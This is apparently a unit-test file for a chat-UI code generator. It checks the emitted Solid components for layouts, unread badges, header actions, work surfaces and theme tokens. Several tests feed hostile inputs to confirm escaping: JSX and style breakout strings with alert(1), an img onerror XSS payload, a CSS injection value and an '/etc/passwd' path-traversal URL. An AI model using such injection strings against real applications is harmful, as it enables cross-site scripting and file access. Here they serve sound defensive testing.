    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('chatController');
    expect(app).not.toContain('ChatThreadController');
  });

  it('composes with the header-close wiring (both closures declared, distinct names, no collision)', () => {
    const app = file(
      generateProject(
        construct({
          layout: 'widget',
          header: { title: 'Acme Support' },
          capabilities: { conversations: true, history: { persistence: 'local' } },
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('let dockClose: (() => void) | undefined;');
    expect(app).toContain('let chatController: ChatThreadController | undefined;');
    expect(app).toContain('onClick={() => dockClose?.()}');
    expect(app).toContain('onOpenChange={(open) => { setDockOpen(open); if (!open) chatController?.closeConversationsList(); }}');
  });
});

// Unread indicators (owner round, 2026-08-26): row dots + a header-toggle
// badge live entirely inside ChatThread (its own conversation-summary state);
// the FAB's badge does not — Dock is a SIBLING, not a descendant, so the only
// way for it to reflect "any conversation is unread" is the emitted App
// mirroring ChatThread's report (onUnreadChange) onto Dock's own (pre-
// existing, unchanged) `unread` prop. Same "layer that would have caught it"
// reasoning as the onConversationLoad/reset-on-close regression tests above:
// every ChatThread-level jsdom test drives `onUnreadChange` directly, so none
// of them can catch the wire between ChatThread and Dock being absent.
describe('conversations + widget: unread indicators wired onto Dock (owner round)', () => {
  it('declares dockOpen/anyUnread signals, wires hostOpen/onUnreadChange onto ChatThread, and unread onto Dock', () => {
    const app = file(
      generateProject(construct({ layout: 'widget', capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('const [dockOpen, setDockOpen] = createSignal(false);');
    expect(app).toContain('const [anyUnread, setAnyUnread] = createSignal(false);');
    expect(app).toContain('hostOpen={dockOpen()} onUnreadChange={setAnyUnread}');
    expect(app).toContain('unread={anyUnread()}');
    expect(app).toContain("import { createSignal } from 'solid-js';");
  });

  it('dockOpen starts true when widget.defaultOpen is true — a widget open by default starts "seen"', () => {
    const app = file(
      generateProject(
        construct({ layout: 'widget', widget: { defaultOpen: true }, capabilities: { conversations: true, history: { persistence: 'local' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('const [dockOpen, setDockOpen] = createSignal(true);');
  });

  it('no conversations capability on a widget: none of the unread wiring is emitted', () => {
    const app = file(generateProject(construct({ layout: 'widget' })), 'src/App.tsx');
    expect(app).not.toContain('dockOpen');
    expect(app).not.toContain('anyUnread');
    expect(app).not.toContain('hostOpen');
    expect(app).not.toContain('onUnreadChange');
    expect(app).not.toContain('unread={');
  });

  it('custom layout with conversations on: no unread wiring — there is no Dock to badge', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], capabilities: { conversations: true, history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('dockOpen');
    expect(app).not.toContain('anyUnread');
  });
});

describe('CU-1: custom layout exclusion disclosure — conversations added', () => {
  it('the emitted comment names conversations among the capabilities NOT wired on custom', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'] })),
      'src/App.tsx',
    );
    expect(app).toContain('conversations');
  });
});

describe('home (Task 5)', () => {
  it('home threads through to ChatThread as one JSON.stringify\'d prop; onHomeLink wiring is NOT emitted (vocabulary-never-logic)', () => {
    const homeInput = { greeting: { title: 'Hi "there"' }, links: [{ label: 'Docs', href: 'https://ui.kitn.ai' }] };
    const c = construct({ home: homeInput });
    const app = file(generateProject(c), 'src/App.tsx');
    // Compute the expected literal from the SAME parsed construct's home
    // value the generator actually sees, not a hand-ordered literal — key
    // order drift in a hand-typed comparison would make this fragile.
    expect(app).toContain(` home={${JSON.stringify(c.home)}}`);
    expect(app).not.toContain('onHomeLink');
  });

  it('no home in the construct → no home prop emitted', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain(' home=');
  });

  it('layout custom does not wire home (pinned, matches header/empty/conversations)', () => {
    const app = file(
      generateProject(construct({ layout: 'custom', slots: ['header'], home: {} })),
      'src/App.tsx',
    );
    expect(app).not.toContain(' home=');
  });

  it('widget close-reset gate includes home (close returns the view to Home)', () => {
    // No conversations capability — home alone must still trigger the
    // widget's close-reset wiring (widgetHasConversationsChrome's gate).
    const app = file(generateProject(construct({ home: {} })), 'src/App.tsx');
    expect(app).toContain('closeConversationsList');
  });
});

describe('aside geometry (B-2)', () => {
  it('defaults preserve the pre-B-2 emit: end edge, 380px, border-inline-start', () => {
    const app = file(generateProject(construct({ layout: 'aside' })), 'src/App.tsx');
    expect(app).toContain("'inset-inline-end': '0'");
    expect(app).toContain('width: "380px"');
    expect(app).toContain("'border-inline-start': '1px solid var(--kai-color-border)'");
  });

  it('position start flips the docked edge, the divider edge, and the mobile reset', () => {
    const app = file(generateProject(construct({ layout: 'aside', aside: { position: 'start', width: '320px' } })), 'src/App.tsx');
    expect(app).toContain("'inset-inline-start': '0'");
    expect(app).toContain('width: "320px"');
    expect(app).toContain("'border-inline-end': '1px solid var(--kai-color-border)'");
    expect(app).toContain('border-inline-end: 0');
  });

  it('a hostile width cannot break out of the style object', () => {
    const hostile = "380px' }} onClick={() => alert(1)} x={{ y: '";
    const app = file(generateProject(construct({ layout: 'aside', aside: { width: hostile } })), 'src/App.tsx');
    expect(app).toContain(`width: ${JSON.stringify(hostile)}`);
    expect(app).not.toContain("width: '380px' }} onClick");
  });
});

describe('capabilities.messageActions (B-3)', () => {
  it('threads role arrays onto ChatThread, whole-array JSON.stringify', () => {
    const app = file(generateProject(construct({
      capabilities: { messageActions: { user: ['edit', 'copy'], assistant: ['copy', 'like', 'speak'] } },
    })), 'src/App.tsx');
    expect(app).toContain(' userActions={["edit","copy"]}');
    expect(app).toContain(' assistantActions={["copy","like","speak"]}');
  });
  it('absent messageActions emits neither prop', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain('userActions=');
    expect(app).not.toContain('assistantActions=');
  });
});

describe('capabilities.sources (B-4 — strip is the citations STRIP, a noun)', () => {
  it('strip: false hides the row (hideSources={true})', () => {
    const app = file(generateProject(construct({ capabilities: { sources: { strip: false } } })), 'src/App.tsx');
    expect(app).toContain(' hideSources={true}');
  });
  it('strip: true and the absent key emit nothing — the kit default IS the on state', () => {
    expect(file(generateProject(construct({ capabilities: { sources: { strip: true } } })), 'src/App.tsx')).not.toContain('hideSources');
    expect(file(generateProject(construct()), 'src/App.tsx')).not.toContain('hideSources');
  });
});

describe('composer.triggers (B-5)', () => {
  it('maps slash/mention onto ChatThread triggers with the kit char/kind pairs', () => {
    const app = file(generateProject(construct({
      composer: { triggers: { slash: [{ id: 'help', label: 'Help' }], mention: [{ id: 'docs', label: 'Docs', description: 'Search docs' }] } },
    })), 'src/App.tsx');
    expect(app).toContain(
      ` triggers={${JSON.stringify([
        { char: '/', kind: 'command', items: [{ id: 'help', label: 'Help' }] },
        { char: '@', kind: 'mention', items: [{ id: 'docs', label: 'Docs', description: 'Search docs' }] },
      ])}}`,
    );
  });
  it('absent composer emits no triggers prop', () => {
    expect(file(generateProject(construct()), 'src/App.tsx')).not.toContain('triggers=');
  });
});

describe('header.themeToggle + header.actions (B-10)', () => {
  it('themeToggle emits a headerEndContent Button flipping the host theme attribute, host passed via the facade', () => {
    const files = generateProject(construct({ layout: 'fullscreen', header: { themeToggle: true } }));
    const app = file(files, 'src/App.tsx');
    const element = file(files, 'src/element.tsx');
    expect(element).toContain('<App host={ctx.element} />');
    expect(app).toContain('export function App(props: { host: HTMLElement })');
    expect(app).toContain('aria-label="Toggle theme"');
    expect(app).toMatch(/setAttribute\('theme'/);
  });

  it('header.actions emit variant-threaded Buttons dispatching kai-header-action with the stringified label', () => {
    const app = file(generateProject(construct({
      layout: 'fullscreen',
      header: { actions: [{ label: 'Docs', variant: 'ghost' }, { label: 'Share' }] },
    })), 'src/App.tsx');
    expect(app).toContain('variant="ghost"');
    // The dispatch moved behind ONE shared `dispatchHeaderAction` closure
    // (S-11: it also carries the once-per-label DEV reminder), so each Button
    // passes its stringified label to that seam instead of composing its own
    // CustomEvent inline. The event itself is unchanged — asserted at the
    // closure, which is now the single site that constructs it.
    expect(app).toContain(`onClick={() => dispatchHeaderAction(${JSON.stringify('Docs')})}`);
    expect(app).toContain("new CustomEvent('kai-header-action', { detail: { label } })");
    expect(app).toContain(`{${JSON.stringify('Share')}}`);
  });

  it('a hostile action label cannot break out of the emitted source', () => {
    // NOTE: JSON.stringify(hostile) itself literally contains the substring
    // 'onClick={alert(1)}' (JSON.stringify escapes quotes/backslashes/control
    // characters, not braces or parens) — so a bare `.not.toContain('onClick=
    // {alert(1)}')` would be unsatisfiable by ANY implementation once the
    // sibling assertion requires the escaped form verbatim. The real
    // invariant (mirrored from the aside-geometry hostile test above) is that
    // the label's own double quotes stay ESCAPED, so it can never close the
    // JS string literal early and let the rest run as live JSX/attribute
    // syntax — checked here as the absence of the UNESCAPED breakout
    // signature a naive template-literal interpolation would produce.
    const hostile = `Docs" onClick={alert(1)} x="`;
    const app = file(generateProject(construct({ layout: 'fullscreen', header: { actions: [{ label: hostile }] } })), 'src/App.tsx');
    expect(app).toContain(JSON.stringify(hostile));
    expect(app).not.toContain('label: "Docs" onClick={alert(1)} x=""');
  });

  it('neither header.actions nor header.themeToggle declared -> no headerEndContent chrome, no host, no Button import', () => {
    const files = generateProject(construct({ layout: 'fullscreen' }));
    const app = file(files, 'src/App.tsx');
    const element = file(files, 'src/element.tsx');
    expect(app).not.toContain('headerEndContent=');
    expect(app).not.toContain('export function App(props: { host: HTMLElement })');
    expect(element).not.toContain('<App host={ctx.element} />');
    expect(app).not.toContain(', Button');
  });
});

describe('shell (B-10)', () => {
  it('commandPalette emits the Mod+K overlay with CommandList + Input and menu-honest entries', () => {
    const app = file(generateProject(construct({ layout: 'fullscreen', shell: { commandPalette: true } })), 'src/App.tsx');
    expect(app).toContain('CommandList');
    expect(app).toContain('Focus composer');
    // Menu-honesty: no dead entries — conversations/themeToggle are off here.
    expect(app).not.toContain('New conversation');
    expect(app).not.toContain('Toggle theme');
  });

  it('palette entries derive from what the construct enables', () => {
    const app = file(generateProject(construct({
      layout: 'fullscreen',
      header: { themeToggle: true },
      shell: { commandPalette: true },
      capabilities: { conversations: true, history: { persistence: 'local' } },
    })), 'src/App.tsx');
    expect(app).toContain('New conversation');
    expect(app).toContain('Toggle theme');
    expect(app).toContain('startNewConversation');
  });

  it('userMenu emits the Dropdown+Avatar recipe dispatching kai-user-menu, name/plan stringified', () => {
    const app = file(generateProject(construct({ layout: 'fullscreen', shell: { userMenu: { name: 'Ada Lovelace', plan: 'Pro' } } })), 'src/App.tsx');
    expect(app).toContain('<Dropdown>');
    expect(app).toContain(`fallback={${JSON.stringify('AD')}}`);
    expect(app).toMatch(/new CustomEvent\('kai-user-menu'/);
    expect(app).toContain(JSON.stringify('Ada Lovelace — Pro account menu'));
  });

  it('userMenu-only construct imports NO Button — the userMenu piece uses only Dropdown/Avatar (regression: Button used to be gated on the composed headerEndContent string, not on which piece actually used it)', () => {
    const app = file(generateProject(construct({ layout: 'fullscreen', shell: { userMenu: { name: 'Ada Lovelace' } } })), 'src/App.tsx');
    expect(app).toContain(
      "import { ChatThread, createKaiChat, Dropdown, DropdownTrigger, DropdownContent, DropdownItem, DropdownSeparator, Avatar } from '@kitn.ai/ui/solid';",
    );
    // Scoped to the import list / a real usage, not the giant static doc
    // comment above `export function App` (which mentions "Button" in prose
    // unconditionally, on every non-custom construct — a bare `.not.toContain
    // ('Button')` would false-fail on that prose regardless of this fix).
    expect(app).not.toContain(', Button');
    expect(app).not.toContain('<Button');
  });
});

describe('the app header strip — `split` composes the promoted AppHeader (2026-08-30)', () => {
  // The owner-reported defect: the emitted Workspace rendered its header chrome
  // as a text "Theme" button, no search at all and a bare avatar, all inside
  // ChatThread's own header row (so, inside the chat rail's width). The story
  // `src/elements/builder-workspace.stories.tsx` is the binding acceptance
  // surface; its `AppHeader` is now a real component and codegen composes THAT.
  const split = (over: Record<string, unknown> = {}): Construct =>
    construct({
      layout: 'split',
      header: {
        title: 'Workspace',
        themeToggle: true,
        actions: [
          { label: 'Share', variant: 'outline' },
          { label: 'Deploy', variant: 'default' },
        ],
      },
      shell: { commandPalette: true, userMenu: { name: 'Ada', plan: 'Pro' } },
      ...over,
    } as never);

  const appOf = (c: Construct) => file(generateProject(c), 'src/App.tsx');

  it('composes <AppHeader> with every T-5 key mapped to its own prop — and imports it from the kit', () => {
    const app = appOf(split());
    expect(app).toContain(', AppHeader');
    expect(app).toContain('<AppHeader');
    // header.title
    expect(app).toContain('title={"Workspace"}');
    // shell.commandPalette -> the search affordance (NOT a rejected
    // `header.search` key), wired to the palette this file actually emits.
    expect(app).toContain('showSearch={true}');
    expect(app).toContain('onSearch={() => setPaletteOpen(true)}');
    // header.themeToggle
    expect(app).toContain('showThemeToggle={true}');
    expect(app).toContain('dark={themeDark()}');
    expect(app).toContain('onToggleDark={toggleTheme}');
    // header.actions
    expect(app).toContain('actions={[{"label":"Share","variant":"outline"},{"label":"Deploy","variant":"default"}]}');
    expect(app).toContain('onActionSelect={(action) => dispatchHeaderAction(action.label)}');
    // shell.userMenu (NOT a rejected `header.user` key)
    expect(app).toContain('user={{"name":"Ada","plan":"Pro"}}');
    expect(app).toContain("new CustomEvent('kai-user-menu', { detail: { item } })");
  });

  it('the strip sits ABOVE the split, as a SIBLING of WorkspaceShell — not inside ChatThread\'s header row', () => {
    const app = appOf(split());
    // The whole point of the defect: nothing lands in headerEndContent anymore.
    expect(app).not.toMatch(/\bheaderEndContent=\{/);
    // ...and no re-derived copy of the arrangement: the old inline pieces are gone.
    expect(app).not.toContain('aria-label="Toggle theme"');
    expect(app).not.toContain(', Dropdown, DropdownTrigger');
    // Order in the emitted JSX: the AppHeader element opens before the shell.
    expect(app.indexOf('<AppHeader')).toBeGreaterThan(-1);
    expect(app.indexOf('<AppHeader')).toBeLessThan(app.indexOf('<WorkspaceShell'));
    // The frame is a flex column and the shell is its flexing item, so the
    // strip spans the frame instead of reserving space inside a column.
    expect(app).toContain("'flex-direction': 'column'");
    expect(app).toContain('<WorkspaceShell class="min-h-0 flex-1"');
  });

  it('the rail keeps its own title row: chatTitle is still emitted alongside the strip (the story ships both)', () => {
    const app = appOf(split());
    expect(app).toContain('chatTitle={"Workspace"}');
  });

  it('MENU-HONESTY: no palette, no search prop at all — never a search button with nothing behind it', () => {
    const app = appOf(split({ shell: { userMenu: { name: 'Ada' } } }));
    expect(app).not.toContain('showSearch');
    expect(app).not.toContain('onSearch');
    // Paired against a vacuous pass: the strip really did render, with the
    // pieces this construct DOES declare.
    expect(app).toContain('<AppHeader');
    expect(app).toContain('user={{"name":"Ada"}}');
  });

  it('each piece is independently optional — a title-only split emits the strip and nothing else in it', () => {
    const app = appOf(split({ header: { title: 'Workspace' }, shell: undefined }));
    expect(app).toContain('<AppHeader');
    expect(app).toContain('title={"Workspace"}');
    expect(app).not.toContain('showThemeToggle');
    expect(app).not.toContain('actions={');
    expect(app).not.toContain('user={');
  });

  it('a bare split (no header, no shell) emits NO strip at all and keeps the old frame', () => {
    const app = appOf(construct({ layout: 'split' }));
    expect(app).not.toContain('AppHeader');
    expect(app).toContain("<div style={{ height: '100dvh' }}>");
    expect(app).toContain('<WorkspaceShell class="h-full"');
  });

  it('the theme toggle resolves the mode it displays — the PROPERTY first, then the attribute, then the system', () => {
    const app = appOf(split());
    // Regression from the live builder: a construct declares its mode through
    // defineWebComponent's prop DEFAULT, so a dark element can carry no `theme`
    // ATTRIBUTE at all. Reading only the attribute drew the light-mode icon on a
    // dark app.
    expect(app).toContain('(props.host as HTMLElement & { theme?: string }).theme');
    expect(app).toContain("props.host.getAttribute('theme')");
    expect(app).toContain("matchMedia('(prefers-color-scheme: dark)')");
    expect(app).toContain("props.host.setAttribute('theme', next ? 'dark' : 'light')");
    // ONE closure: the palette's own "Toggle theme" row runs the same one.
    expect(app).toContain("if (id === 'toggle-theme') toggleTheme();");
  });

  it('every other layout keeps its header-end row untouched — this is scoped to `split` on purpose', () => {
    const app = appOf(
      construct({
        layout: 'fullscreen',
        header: { title: 'Workspace', themeToggle: true, actions: [{ label: 'Share' }] },
        shell: { userMenu: { name: 'Ada' } },
      } as never),
    );
    expect(app).not.toContain('AppHeader');
    expect(app).toContain('headerEndContent={');
    expect(app).toContain('aria-label="Toggle theme"');
  });

  it('untrusted header text is JSON.stringify\'d at every emit site, and cannot break out of the JSX', () => {
    const title = '</div><b>x</b>';
    const label = '"><img onerror=alert(1) src=x>';
    const user = { name: '"><b>', plan: 'Pro' };
    const app = appOf(split({ header: { title, actions: [{ label }] }, shell: { userMenu: user } }));
    expect(app).toContain(`title={${JSON.stringify(title)}}`);
    expect(app).toContain(`actions={${JSON.stringify([{ label }])}}`);
    expect(app).toContain(`user={${JSON.stringify(user)}}`);
    // The payload's own double quote is what makes this matter: a raw JSX
    // attribute string (title="...") would be CLOSED by it. JSON.stringify
    // produces a real JS string-literal EXPRESSION instead, so the quote lands
    // escaped and there is no attribute to break out of.
    expect(app).toContain('\\"><b>');
    expect(app).not.toContain('title="');
    expect(app).not.toContain('label="');
  });

  it('is deterministic', () => {
    expect(generateProject(split())).toEqual(generateProject(split()));
  });
});

it('is deterministic across the full phase-1 vocabulary', () => {
  const full = () => construct({
    layout: 'aside',
    aside: { position: 'start', width: '320px' },
    header: { title: 'Acme', themeToggle: true, actions: [{ label: 'Docs', variant: 'ghost' }] },
    composer: { triggers: { slash: [{ id: 'help', label: 'Help' }] } },
    shell: { commandPalette: true, userMenu: { name: 'Ada' } },
    capabilities: {
      messageActions: { user: ['edit'], assistant: ['copy', 'speak'] },
      sources: { strip: false },
    },
  });
  expect(generateProject(full())).toEqual(generateProject(full()));
});

describe('workSurface — the split pane renders (2026-08-30)', () => {
  const ws = (over: Record<string, unknown> = {}) =>
    construct({
      layout: 'split',
      workSurface: { kind: 'artifact', url: '/work-surface.html', chrome: { expand: true }, ...over },
    } as never);

  it('imports WorkSurface only when workSurface is declared (the emitted project runs noUnusedLocals)', () => {
    expect(file(generateProject(ws()), 'src/App.tsx')).toContain(', WorkSurface');
    expect(file(generateProject(construct({ layout: 'split' })), 'src/App.tsx')).not.toContain('WorkSurface');
  });

  it('emits the surface as <slot name="pane"> FALLBACK, so a consumer projection still wins', () => {
    const app = file(generateProject(ws()), 'src/App.tsx');
    expect(app).toMatch(/<slot name="pane">[^]*<WorkSurface[^]*<\/slot>/);
    expect(app).toContain('projection WINS');
  });

  it('follows the story: chat is the resizable START rail, the surface fills the main region', () => {
    const app = file(generateProject(ws()), 'src/App.tsx');
    expect(app).toContain('startWidth={360}');
    expect(app).toContain('startMinWidth={280}');
    expect(app).toContain('startMaxWidth={520}');
    expect(app).toMatch(/start=\{[^]*<ChatThread/);
  });

  it('threads url, kind and every chrome flag through as real props', () => {
    const app = file(
      generateProject(ws({ kind: 'preview', chrome: { deviceToggle: true, urlBar: true, openInNewTab: true, expand: true } })),
      'src/App.tsx',
    );
    expect(app).toContain('src={"/work-surface.html"}');
    expect(app).toContain('variant="preview"');
    expect(app).toContain('iframeTitle={"App preview"}');
    expect(app).toContain('showDeviceToggle={true}');
    expect(app).toContain('showUrlBar={true}');
    expect(app).toContain('showOpenInNewTab={true}');
    expect(app).toContain('showExpand={true}');
    expect(app).toContain('showCodeView={false}');
  });

  it('kind: artifact gets the framed-card look and its own iframe title', () => {
    const app = file(generateProject(ws()), 'src/App.tsx');
    expect(app).toContain('variant="artifact"');
    expect(app).toContain('iframeTitle={"Work surface"}');
  });

  it('an absent chrome key emits false — off-by-default, never an implicit prop', () => {
    const app = file(generateProject(ws({ chrome: undefined })), 'src/App.tsx');
    expect(app).toContain('showDeviceToggle={false}');
    expect(app).toContain('showExpand={false}');
  });

  it('expand is wired to WorkspaceShell.startCollapsed, the mechanism the story ruled on', () => {
    const app = file(generateProject(ws()), 'src/App.tsx');
    expect(app).toContain('const [surfaceExpanded, setSurfaceExpanded] = createSignal(false)');
    expect(app).toContain('startCollapsed={surfaceExpanded()}');
    expect(app).toContain('onExpandedChange={setSurfaceExpanded}');
  });

  it('codeView threads codeSrc through', () => {
    const app = file(generateProject(ws({ codeUrl: '/src.html', chrome: { codeView: true } })), 'src/App.tsx');
    expect(app).toContain('showCodeView={true}');
    expect(app).toContain('codeSrc={"/src.html"}');
  });

  it('codeView with NO codeUrl still emits the toggle and no codeSrc — components/work-surface.tsx owns the empty state (owner ruling, 2026-08-30)', () => {
    const app = file(generateProject(ws({ chrome: { codeView: true } })), 'src/App.tsx');
    expect(app).toContain('showCodeView={true}');
    expect(app).not.toContain('codeSrc=');
    // No second placeholder page gets written for a source nobody pointed at.
    expect(generateProject(ws({ chrome: { codeView: true } })).map((f) => f.path)).toEqual(
      expect.not.arrayContaining(['public/work-surface-source.html']),
    );
  });

  it('emits public/work-surface.html at a CONSTANT path for a relative url — never derived from construct text', () => {
    expect(generateProject(ws()).map((f) => f.path)).toContain('public/work-surface.html');
    const html = file(generateProject(ws()), 'public/work-surface.html');
    expect(html).toContain('Your work surface');
    expect(file(generateProject(ws({ kind: 'preview' })), 'public/work-surface.html')).toContain('Your app preview');
  });

  it('does NOT emit the placeholder for an absolute url — that page is somebody else\'s', () => {
    expect(generateProject(ws({ url: 'https://example.com/app' })).map((f) => f.path)).not.toContain(
      'public/work-surface.html',
    );
  });

  it('a path-traversal url cannot move the write target — the filename is a constant', () => {
    const files = generateProject(ws({ url: '/../../etc/passwd' }));
    expect(files.filter((f) => f.path.startsWith('public/')).map((f) => f.path)).toEqual(['public/work-surface.html']);
  });

  it('split WITHOUT workSurface: the empty pane no longer reserves a column', () => {
    const app = file(generateProject(construct({ layout: 'split' })), 'src/App.tsx');
    expect(app).toContain('<slot name="pane" />');
    expect(app).toContain('paneProjected()');
    expect(app).toContain('MutationObserver');
    expect(app).toContain('end={paneProjected()');
  });

  it('header actions carry a once-per-label DEV reminder naming the seam', () => {
    const app = file(
      generateProject(construct({ header: { title: 'X', actions: [{ label: 'Share' }] } } as never)),
      'src/App.tsx',
    );
    expect(app).toContain('import.meta.env.DEV');
    expect(app).toContain("addEventListener('kai-header-action'");
    expect(app).toContain('dispatchHeaderAction');
  });
});

describe('theme.tokens emission (full palette persistence)', () => {
  const themed = (tokens: NonNullable<NonNullable<Construct['theme']>['tokens']>, extra: Partial<NonNullable<Construct['theme']>> = {}) =>
    construct({ theme: { mode: 'system', ...extra, tokens } });

  it('light tokens + radius + fonts land on the HOST via setProperty, exactly like accent', () => {
    const element = file(
      generateProject(
        themed({
          light: { '--kai-color-background': 'hsl(266 30% 96%)' },
          radius: '1.1rem',
          fonts: { '--kai-font-base': 'Georgia, serif' },
        }),
      ),
      'src/element.tsx',
    );
    expect(element).toContain(
      'ctx.element.style.setProperty("--kai-color-background", "hsl(266 30% 96%)");',
    );
    expect(element).toContain('ctx.element.style.setProperty("--kai-radius", "1.1rem");');
    expect(element).toContain('ctx.element.style.setProperty("--kai-font-base", "Georgia, serif");');
  });

  it('tokens WIN over accent on the same knob: accent setProperty emits first, token after (last write wins)', () => {
    const element = file(
      generateProject(
        themed({ light: { '--kai-color-primary': 'hsl(200 90% 40%)' } }, { accent: '#e91e63' }),
      ),
      'src/element.tsx',
    );
    const accentAt = element.indexOf("setProperty('--kai-color-primary', \"#e91e63\")");
    const tokenAt = element.indexOf('setProperty("--kai-color-primary", "hsl(200 90% 40%)")');
    expect(accentAt).toBeGreaterThan(-1);
    expect(tokenAt).toBeGreaterThan(accentAt);
  });

  it('dark tokens emit as a .dark rule in the shadow <style> — the wrapper defineWebComponent classes, NOT setProperty (an inline custom property has no mode)', () => {
    const element = file(
      generateProject(
        themed({
          dark: {
            '--kai-color-background': 'hsl(150 30% 8%)',
            '--kai-color-primary': 'hsl(150 60% 60%)',
          },
        }),
      ),
      'src/element.tsx',
    );
    // The rule rides the same emitted <style> mechanism as the accent-contrast
    // :host block; values were validated at the schema doorway.
    expect(element).toContain('.dark {');
    expect(element).toContain('--kai-color-background: hsl(150 30% 8%);');
    expect(element).toContain('--kai-color-primary: hsl(150 60% 60%);');
    // Dark values must never ride setProperty — that would apply in BOTH modes.
    expect(element).not.toContain('setProperty("--kai-color-background"');
  });

  it('dark tokens compose with the accent contrast block in ONE <style>', () => {
    const element = file(
      generateProject(
        themed({ dark: { '--kai-color-background': 'hsl(150 30% 8%)' } }, { accent: '#e91e63' }),
      ),
      'src/element.tsx',
    );
    expect(element).toContain('--kai-color-primary-foreground');
    expect(element).toContain('.dark {');
    // One <style> element, not two.
    expect(element.match(/<style>/g)?.length).toBe(1);
  });

  it('codegen re-asserts dark values before interpolating into CSS text (unreachable via validateConstruct, loud if bypassed)', () => {
    const c = construct();
    const bypassed = {
      ...c,
      theme: { mode: 'system', tokens: { dark: { '--kai-color-background': 'red; } * { color: red' } } },
    } as unknown as Construct;
    expect(() => generateProject(bypassed)).toThrow(/unsafe value/);
    const badKey = {
      ...c,
      theme: { mode: 'system', tokens: { dark: { '--kai-radius': '1rem' } } },
    } as unknown as Construct;
    expect(() => generateProject(badKey)).toThrow(/--kai-color-\*/);
  });

  it('tokens without accent/unreadColor still produce a ctx-taking facade; no tokens at all keeps the plain facade', () => {
    const withTokens = file(
      generateProject(themed({ light: { '--kai-color-background': 'white' } })),
      'src/element.tsx',
    );
    expect(withTokens).toContain('(_props, ctx) =>');
    const plain = file(generateProject(construct()), 'src/element.tsx');
    expect(plain).toContain('() => <App />');
  });
});
